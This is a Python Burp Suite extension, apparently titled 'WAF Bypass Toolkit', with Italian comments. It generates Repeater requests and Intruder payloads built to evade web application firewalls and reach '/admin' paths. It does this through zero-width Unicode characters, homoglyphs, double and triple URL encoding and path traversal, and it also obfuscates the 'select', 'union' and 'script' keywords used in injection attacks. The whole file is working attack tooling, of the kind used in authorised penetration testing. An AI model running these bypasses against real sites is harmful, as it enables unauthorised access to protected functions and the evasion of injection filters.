# waf_bypass_burp.py
from burp import IBurpExtender, IContextMenuFactory, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
from javax.swing import JMenuItem
from java.util import ArrayList

class BurpExtender(IBurpExtender, IContextMenuFactory, IIntruderPayloadGeneratorFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("WAF Bypass Toolkit")
        callbacks.registerContextMenuFactory(self)
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        
    def createMenuItems(self, invocation):
        """Menu per Repeater"""
        menu_list = ArrayList()
        menu_item = JMenuItem("Send to Repeater with Bypasses")
        menu_item.addActionListener(lambda x: self.sendWithBypasses(invocation))
        menu_list.add(menu_item)
        return menu_list
    
    def sendWithBypasses(self, invocation):
        """Invia a Repeater con varianti bypass"""
        messages = invocation.getSelectedMessages()
        
        for message in messages:
            request = message.getRequest()
            requestString = self._helpers.bytesToString(request)
            
            # Bypass list
            bypasses = [
                ("Original", requestString),
                ("Unicode ZWSP", requestString.replace("admin", "ad\u200bmin")),
                ("Unicode ZWNJ", requestString.replace("admin", "ad\u200cmin")),
                ("Unicode Greek", requestString.replace("admin", "\u03b1dmin")),
                ("Path Bypass", requestString.replace("/admin", "/admin/../admin")),
                ("Double URL", requestString.replace("admin", "%2561dmin"))
            ]
            
            # Send each to Repeater
            for name, bypass_request in bypasses:
                self._callbacks.sendToRepeater(
                    message.getHost(),
                    message.getPort(),
                    message.getProtocol() == "https",
                    self._helpers.stringToBytes(bypass_request),
                    name
                )
    
    def getGeneratorName(self):
        """Nome per Intruder"""
        return "WAF Bypasses"
    
    def createNewInstance(self, attack):
        """Generator per Intruder"""
        return BypassPayloadGenerator()

class BypassPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self.payloads = [
            # Unicode bypasses
            "ad\u200bmin",      # ZWSP
            "ad\u200cmin",      # ZWNJ  
            "ad\u200dmin",      # ZWJ
            "\u03b1dmin",       # Greek alpha
            "sel\u200bect",
            "uni\u200bon",
            "scr\u200bipt",
            # Encoding
            "%2561dmin",
            "%252561dmin",
            "a%64min",
            # Path
            "/admin/../admin",
            "//admin",
            "/Admin"
        ]
        self.index = 0
    
    def hasMorePayloads(self):
        return self.index < len(self.payloads)
    
    def getNextPayload(self, baseValue):
        payload = self.payloads[self.index]
        self.index += 1
        return payload
    
    def reset(self):
        self.index = 0